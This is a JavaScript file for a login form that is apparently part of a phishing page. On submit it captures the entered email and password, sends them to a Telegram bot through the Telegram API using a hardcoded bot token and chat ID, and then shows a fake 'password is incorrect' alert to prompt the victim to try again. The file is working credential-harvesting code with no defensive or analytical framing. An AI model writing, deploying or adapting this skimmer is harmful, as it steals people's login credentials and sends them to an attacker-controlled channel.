document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault(); // Prevent the form from submitting normally

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Check if email or password is empty
    if (!email || !password) {
        
    }

    // Display alert with email and password
});

const TOKEN = "7942892612:AAEPd7Jnei-tATC19kmdIyevltwgX22a3WE"; // Bot token obtained from BotFather
const CHAT_ID = "5640809308"; // Chat ID obtained from getUpdates
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

// Listen for form submission again
document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault(); // Prevent normal submission

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Log email and password to the console
    console.log("Email:", email);
    console.log("Password:", password);
    console.log(axios);  // Check if axios is properly loaded

    // Check if fields are empty
    if (!email || !password) {
       
    }

    // Create the message to send
    const message = `
        <b>Login Attempt:</b>\n
        <b>Email:</b> ${email}\n
        <b>Password:</b> ${password}
    `;

    // Send the message via axios
    axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message,
    })
    .then(response => {
        console.log("Message sent successfully:", response.data);
        alert('Your password is incorrect. Please check it.');
    })
    .catch(error => {
        console.error("Error sending message:", error.response ? error.response.data : error);
        alert('Error sending message.');
    });
});
